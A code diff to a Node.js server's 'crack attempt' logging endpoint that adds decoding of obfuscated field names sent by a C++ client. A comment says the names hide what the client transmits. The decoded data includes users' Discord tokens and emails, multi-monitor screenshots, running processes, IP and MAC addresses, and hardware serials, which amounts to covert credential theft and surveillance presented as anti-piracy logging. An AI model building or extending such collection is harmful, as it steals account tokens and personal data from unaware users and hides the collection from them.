@@ -938,21 +938,68 @@ app.post('/auth/admin/revoke-key', (req, res) => {
 // CRACK DETECTION LOGGING SYSTEM
 // ========================================
 
+// Decode obfuscated field names from C++ client
+// The client sends shortened field names to hide what data is being transmitted
+const obfuscatedFieldMap = {
+    'a_s': 'app_secret',
+    'h': 'hwid',
+    'dt': 'detection_type',
+    'dtl': 'detected_tool',
+    'cn': 'computer_name',
+    'un': 'username',
+    'ma': 'mac_address',
+    'pi': 'public_ip',
+    'c': 'cpu',
+    'g': 'gpu',
+    'r': 'ram',
+    'wv': 'windows_version',
+    'ds': 'disk_serial',
+    'mb': 'motherboard',
+    'bi': 'bios',
+    'na': 'network_adapters',
+    'sr': 'screen_resolution',
+    'tz': 'timezone',
+    'su': 'system_uptime',
+    'rp': 'running_processes',
+    'dui': 'discord_user_id',
+    'dun': 'discord_username',
+    'dd': 'discord_discriminator',
+    'de': 'discord_email',
+    'dtkn': 'discord_token',
+    'mc': 'monitor_count',
+    'sb64': 'screenshots_base64',
+    'ts': 'timestamp'
+};
+
+// Function to decode obfuscated request body
+function decodeObfuscatedBody(body) {
+    const decoded = {};
+    for (const [key, value] of Object.entries(body)) {
+        const decodedKey = obfuscatedFieldMap[key] || key;
+        decoded[decodedKey] = value;
+    }
+    return decoded;
+}
+
 // Log a crack attempt (called from C++ client)
 app.post('/auth/log-crack-attempt', (req, res) => {
     try {
         const serverIP = getIP(req);
-            const { 
+        
+        // Decode obfuscated fields (if client sends obfuscated data)
+        const decodedBody = decodeObfuscatedBody(req.body);
+        
+        const { 
             hwid, 
             gpu_hash,
             motherboard_uuid,
             detection_type,
             detected_tool,
             screenshot_base64,
-            screenshots_base64, // NEW: Multi-monitor screenshots (separated by |||)
-            monitor_count,      // NEW: Number of monitors
+            screenshots_base64, // Multi-monitor screenshots (separated by |||)
+            monitor_count,      // Number of monitors
             system_info,
-                username, 
+            username, 
             computer_name,
             windows_version,
             mac_address,
@@ -960,8 +1007,8 @@ app.post('/auth/log-crack-attempt', (req, res) => {
             gpu,
             ram,
             disk_serial,
-                timestamp, 
-            // NEW FIELDS
+            timestamp, 
+            // Additional fields
             public_ip,
             motherboard,
             bios,
@@ -975,7 +1022,7 @@ app.post('/auth/log-crack-attempt', (req, res) => {
             discord_discriminator,
             discord_email,
             discord_token
-            } = req.body;
+        } = { ...req.body, ...decodedBody }; // Merge original and decoded
             
         // Use public IP if provided (more accurate), fallback to server-detected IP
         const ip = public_ip && public_ip !== 'Unknown' ? public_ip : serverIP;
